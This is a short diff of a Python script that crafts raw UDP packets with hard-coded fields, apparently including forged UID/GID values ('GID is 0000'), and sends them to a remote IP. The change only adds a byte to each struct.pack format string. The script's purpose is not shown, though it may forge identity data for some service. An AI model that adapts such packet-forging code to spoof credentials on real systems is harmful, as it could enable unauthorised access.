@@ -75,7 +75,7 @@ sock.sendto(string, (R_IP, UDP_PORT))
 time.sleep(0.05)
 
 # This next packet sends UID/GID and other info
-string = struct.pack('>HBBHHBBBBHHHHHHBBHBBBBBBBBHBBBBBBBB', 0x8066, 0x31, SEQ, 0x7499, 0xcf6e, IP8, IP7, IP6, IP5,
+string = struct.pack('>HBBHHBBBBHHHHHHBBHBBBBBBBBHBBBBBBBBB', 0x8066, 0x31, SEQ, 0x7499, 0xcf6e, IP8, IP7, IP6, IP5,
 	0x0000, 0x0000, 0x0303, 0x0404, 0x0a05, 0x0a10,
 	RAN, 0x00,0x0000, 0x01, UID1, 0x20,GID1, UID2, 0x00, GID2, 0x00, 0x0000,  0x01, UID1,
 	0x20, GID1, UID2, 0x00, GID2, 0x00, 0x00)   # GID is 0000
@@ -115,7 +115,7 @@ sock.sendto(string, (R_IP, UDP_PORT2))
 time.sleep(0.2)
 
 # This next packet sends stop UID/GID and other info
-string = struct.pack('>HBBHHBBBBHHHHHHBBHBBBBBBBBHBBBBBBBB', 0x8066, 0x31, SEQ, 0x7499, 0xcf6e, IP8, IP7, IP6, IP5,
+string = struct.pack('>HBBHHBBBBHHHHHHBBHBBBBBBBBHBBBBBBBBB', 0x8066, 0x31, SEQ, 0x7499, 0xcf6e, IP8, IP7, IP6, IP5,
 	0x0000, 0x0000, 0x0303, 0x0404, 0x0a05, 0x0a10,
 	RAN, 0x00,0x0000, 0x08, UID1, 0x20,GID1, UID2, 0x00, GID2, 0x00, 0x0000,  0x01, UID1,
 	0x20, GID1, UID2, 0x00, GID2, 0x00, 0x00)   # GID is 0000
